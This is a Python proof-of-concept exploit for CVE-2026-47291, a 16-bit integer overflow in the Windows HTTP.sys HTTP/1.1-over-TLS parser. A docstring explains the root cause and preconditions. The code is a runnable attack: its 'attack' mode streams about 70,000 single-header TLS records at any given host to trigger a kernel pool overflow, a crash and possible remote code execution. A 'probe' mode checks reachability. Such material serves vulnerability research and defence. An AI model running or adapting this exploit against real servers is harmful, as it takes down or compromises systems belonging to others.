#!/usr/bin/env python3
r"""
@w3bd3vil

CVE-2026-47291 - HTTP.sys HTTP/1.1-over-TLS buffer-reference-array integer overflow
================================================================================

Root cause (verified in http.sys UlpReferenceBuffers, inlined into UlpParseNextRequest):

    capacity = *(u16*)(request + 0x640);           # slots allocated (16-bit!)
    count    = *(u16*)(request + 0x642);            # slots used
    if (count >= capacity) {
        new = ExAllocatePool3(0x42, 0x28 + capacity*8, 'UlRR');  # uses OLD capacity
        memmove(new, ref_array, count*8);                        # copies count*8 bytes
        capacity += 5;                                           # 16-bit add, NO overflow check
        ref_array = new;
    }
    ref_array[count++] = buffer;                    # append current UL_REQUEST_BUFFER

Each *TLS record* decrypted by SChannel is delivered to the parser as one
UL_REQUEST_BUFFER (UlHttpBufferReceiveEvent -> UlpCopyIndicatedData ->
UlAllocateRequestBuffer). If every record carries exactly one complete,
CRLF-terminated header line, the parser fully consumes each buffer without
setting the partial-parse flag, so UlpAdjustBuffers takes its non-merge path
and keeps a *distinct* buffer reference per record -> 1 record == 1 reference.

Growth math: capacity climbs 5 at a time. After 13107 growths capacity = 0xFFFB;
the next growth computes 0xFFFB + 5 = 0x10000 which truncates to 0x0000 in the
16-bit field. On the following append, count (>= 65536) >= capacity (0) triggers
a growth that allocates only 0x28 + 0*8 = 40 bytes but memmoves count*8 (~524 KB)
from the old array -> ~500 KB NonPagedPool heap buffer overflow -> bugcheck /
potential kernel RCE.

Preconditions:
  * HTTP/1.x over TLS reachable (HTTPS listener). HTTP/2 / HTTP/3 use other parsers.
  * MaxRequestBytes >= ~262144 (0x40000). Default 16384 is too small.
  * Target build is pre-fix, OR the fix KIR (Feature_1441770810 /
    UxKirRefBufferOverflowCheck) is disabled. Patched+enabled hosts instead cleanly
    reject the request when capacity+5 would wrap (connection dropped, no crash).

This PoC opens a TLS connection, sends the request-line and Host header each in
their own record, then streams ~N single-header records (one send() == one TLS
record with OpenSSL) and never terminates the header block, so the reference
array keeps growing until the wrap.

Reference: 
https://www.zerodayinitiative.com/blog/2026/7/9/cve-2026-47291-remote-code-execution-in-the-windows-httpsys
"""
import argparse
import socket
import ssl
import sys
import time


def build_ctx():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Deliberately DO NOT advertise h2 via ALPN: force server onto the HTTP/1.1
    # parser, which is the only path that grows the buffer-reference array.
    try:
        ctx.set_alpn_protocols(["http/1.1"])
    except NotImplementedError:
        pass
    # Keep records small enough that one send() == one record.
    return ctx


def connect(host, port, timeout):
    raw = socket.create_connection((host, port), timeout=timeout)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    ctx = build_ctx()
    s = ctx.wrap_socket(raw, server_hostname=host)
    print(f"[+] TLS established: {s.version()} / cipher {s.cipher()[0]}")
    ap = s.selected_alpn_protocol()
    print(f"[+] ALPN selected: {ap or '(none -> HTTP/1.1)'}")
    if ap == "h2":
        print("[!] Server negotiated HTTP/2 - the vulnerable path is HTTP/1.1 only. Aborting.")
        s.close()
        sys.exit(2)
    return s


def rec(s, data):
    """Send one TLS record (one SSL_write == one application_data record)."""
    s.sendall(data if isinstance(data, bytes) else data.encode())


def attack(args):
    s = connect(args.host, args.port, args.timeout)
    # Request-line record and Host record, each in their own TLS record.
    rec(s, f"GET {args.path} HTTP/1.1\r\n")
    rec(s, f"Host: {args.host}\r\n")
    print(f"[+] Streaming up to {args.count} single-header TLS records "
          f"(one CRLF-terminated header per record)...")
    t0 = time.time()
    sent = 0
    try:
        for i in range(args.count):
            # Distinct short header names avoid duplicate-value concatenation limits.
            rec(s, b"X-P%x:1\r\n" % i)
            sent += 1
            if args.pace:
                time.sleep(args.pace)
            if sent % 5000 == 0:
                dt = time.time() - t0
                print(f"    {sent:>7} records  ({sent/max(dt,1e-9):,.0f} rec/s, {dt:,.1f}s)  "
                      f"~capacity growths={sent // 5}")
        # We normally never get here before the wrap (~65536). If we do, finish the
        # request so the server responds, proving the plumbing without a crash.
        rec(s, b"\r\n")
        s.settimeout(args.timeout)
        resp = s.recv(4096)
        print(f"[+] Sent all {sent} records without crash; server replied:\n"
              f"    {resp.split(chr(13).encode())[0].decode(errors='replace')}")
        print("[i] No bugcheck -> target is patched (fix enabled) or not vulnerable.")
    except (ssl.SSLError, socket.error, ConnectionError, OSError) as e:
        dt = time.time() - t0
        print(f"[!] Connection died after {sent} records ({dt:,.1f}s): {e!r}")
        if sent >= 65000:
            print("[***] Died at the wrap boundary (~65536). Consistent with the "
                  "pool overflow firing -> check target for a bugcheck (0x139/0xCA/0x19).")
        else:
            print("[i] Died early - likely a server-side limit/timeout, not the overflow.")
    finally:
        try:
            s.close()
        except Exception:
            pass


def probe(args):
    """Non-destructive: prove HTTP/1.1-over-TLS + one-record-per-header works and
    the server keeps accepting many small header records, then complete the request."""
    s = connect(args.host, args.port, args.timeout)
    rec(s, f"GET {args.path} HTTP/1.1\r\n")
    rec(s, f"Host: {args.host}\r\n")
    n = min(args.count, 2000)
    print(f"[+] Probe: sending {n} single-header records then finishing the request...")
    for i in range(n):
        rec(s, b"X-P%x:1\r\n" % i)
    rec(s, b"\r\n")
    s.settimeout(args.timeout)
    try:
        resp = s.recv(4096)
        line = resp.split(b"\r\n")[0].decode(errors="replace")
        print(f"[+] Server responded over HTTP/1.1: {line!r}")
        print("[+] Plumbing confirmed: HTTP/1.1-over-TLS reachable, small records accepted.")
    except socket.timeout:
        print("[i] No response (server still waiting / dropped) - inspect manually.")
    finally:
        s.close()


def main():
    ap = argparse.ArgumentParser(description="CVE-2026-47291 HTTP.sys TLS buffer-ref overflow PoC")
    ap.add_argument("host")
    ap.add_argument("-p", "--port", type=int, default=443)
    ap.add_argument("--path", default="/")
    ap.add_argument("-n", "--count", type=int, default=70000,
                    help="number of single-header records to stream (default 70000; wrap ~65536)")
    ap.add_argument("--pace", type=float, default=0.0015,
                    help="seconds to sleep between records (default 0.0015 ~ 650 rec/s). ")
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--mode", choices=["attack", "probe"], default="probe",
                    help="probe = non-destructive plumbing check (default); attack = full overflow")
    args = ap.parse_args()

    print(f"[*] Target https://{args.host}:{args.port}{args.path}  mode={args.mode}")
    if args.mode == "probe":
        probe(args)
    else:
        print("[!] ATTACK mode: this will drive a kernel pool overflow on a VULNERABLE target "
              "(bugcheck / reboot).")
        attack(args)


if __name__ == "__main__":
    main()
